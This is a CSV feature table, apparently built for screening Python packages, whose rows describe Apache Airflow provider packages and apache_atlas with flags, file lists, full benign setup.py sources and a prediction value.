package_name,has_susp_url,Popular,is_license,is_valid_author_emails,is_valid_homepage,PostInstallCommand,min_cfg,has_verylong_string,file_list,setup.py,predictions
apache-airflow-providers-pagerduty-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py pagerduty.py pagerduty_events.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-pagerduty package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-pagerduty setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.pagerduty', 'airflow.providers.pagerduty.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-papermill-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py papermill.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-papermill package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-papermill setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.papermill', 'airflow.providers.papermill.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-postgres-5.1.0,0,1,1,1,1,0,0,0,get_provider_info.py postgres.py __init__.py postgres.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-postgres package.""""""

from setuptools import find_namespace_packages, setup

version = '5.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-postgres setup.""""""
    setup(
        version=version,
        extras_require={
            'amazon': ['apache-airflow-providers-amazon'],
            'common.sql': ['apache-airflow-providers-common-sql'],
        },
        packages=find_namespace_packages(
            include=['airflow.providers.postgres', 'airflow.providers.postgres.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-redis-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py redis.py __init__.py redis_publish.py __init__.py redis_key.py redis_pub_sub.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-redis package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-redis setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.redis', 'airflow.providers.redis.*']),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-salesforce-5.1.0,0,1,1,1,1,0,0,0,get_provider_info.py salesforce.py __init__.py bulk.py salesforce_apex_rest.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-salesforce package.""""""

from setuptools import find_namespace_packages, setup

version = '5.1.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-salesforce setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.salesforce', 'airflow.providers.salesforce.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-sendgrid-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py emailer.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-sendgrid package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-sendgrid setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.sendgrid', 'airflow.providers.sendgrid.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-sftp-4.0.0,0,1,1,1,1,0,0,0,get_provider_info.py sftp.py __init__.py sftp.py __init__.py sftp.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-sftp package.""""""

from setuptools import find_namespace_packages, setup

version = '4.0.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-sftp setup.""""""
    setup(
        version=version,
        extras_require={'ssh': ['apache-airflow-providers-ssh']},
        packages=find_namespace_packages(include=['airflow.providers.sftp', 'airflow.providers.sftp.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-slack-5.1.0,0,1,1,1,1,0,0,0,example_slack.py __init__.py get_provider_info.py slack.py slack_webhook.py __init__.py slack.py slack_webhook.py __init__.py sql_to_slack.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-slack package.""""""

from setuptools import find_namespace_packages, setup

version = '5.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-slack setup.""""""
    setup(
        version=version,
        extras_require={
            'common.sql': ['apache-airflow-providers-common-sql'],
            'http': ['apache-airflow-providers-http'],
        },
        packages=find_namespace_packages(include=['airflow.providers.slack', 'airflow.providers.slack.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-snowflake-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py snowflake.py __init__.py snowflake.py __init__.py s3_to_snowflake.py snowflake_to_slack.py __init__.py common.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-snowflake package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-snowflake setup.""""""
    setup(
        version=version,
        extras_require={
            'common.sql': ['apache-airflow-providers-common-sql'],
            'slack': ['apache-airflow-providers-slack'],
        },
        packages=find_namespace_packages(
            include=['airflow.providers.snowflake', 'airflow.providers.snowflake.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-sqlite-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py sqlite.py __init__.py sqlite.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-sqlite package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-sqlite setup.""""""
    setup(
        version=version,
        extras_require={'common.sql': ['apache-airflow-providers-common-sql']},
        packages=find_namespace_packages(include=['airflow.providers.sqlite', 'airflow.providers.sqlite.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-ssh-3.1.0,0,1,1,1,1,0,0,0,get_provider_info.py ssh.py __init__.py ssh.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-ssh package.""""""

from setuptools import find_namespace_packages, setup

version = '3.1.0'


def do_setup():
    """"""Perform the package apache-airflow-providers-ssh setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(include=['airflow.providers.ssh', 'airflow.providers.ssh.*']),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-tableau-3.0.1,0,1,1,1,1,0,0,0,get_provider_info.py tableau.py __init__.py tableau.py tableau_refresh_workbook.py __init__.py tableau.py tableau_job_status.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-tableau package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.1'


def do_setup():
    """"""Perform the package apache-airflow-providers-tableau setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.tableau', 'airflow.providers.tableau.*']
        ),
    )


if __name__ == ""__main__"":
    do_setup()
",1
apache-airflow-providers-telegram-3.0.0,0,1,1,1,1,0,0,0,get_provider_info.py telegram.py __init__.py telegram.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.rst setup.cfg setup.py,"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# NOTE! THIS FILE IS AUTOMATICALLY GENERATED AND WILL BE
# OVERWRITTEN WHEN PREPARING PACKAGES.
#
# IF YOU WANT TO MODIFY IT, YOU SHOULD MODIFY THE TEMPLATE
# `SETUP_TEMPLATE.py.jinja2` IN the `dev/provider_packages` DIRECTORY

""""""Setup.py for the apache-airflow-providers-telegram package.""""""

from setuptools import find_namespace_packages, setup

version = '3.0.0'

def do_setup():
    """"""Perform the package apache-airflow-providers-telegram setup.""""""
    setup(
        version=version,
        extras_require={},
        packages=find_namespace_packages(
            include=['airflow.providers.telegram', 'airflow.providers.telegram.*']
        ),
    )

if __name__ == ""__main__"":
    do_setup()
",1
apache_atlas-0.0.11,0,1,1,1,1,0,1,0,admin.py base_client.py discovery.py entity.py glossary.py lineage.py relationship.py typedef.py __init__.py exceptions.py admin.py discovery.py enums.py glossary.py instance.py lineage.py metrics.py misc.py profile.py relationship.py typedef.py __init__.py utils.py __init__.py LICENSE METADATA RECORD top_level.txt WHEEL,,1
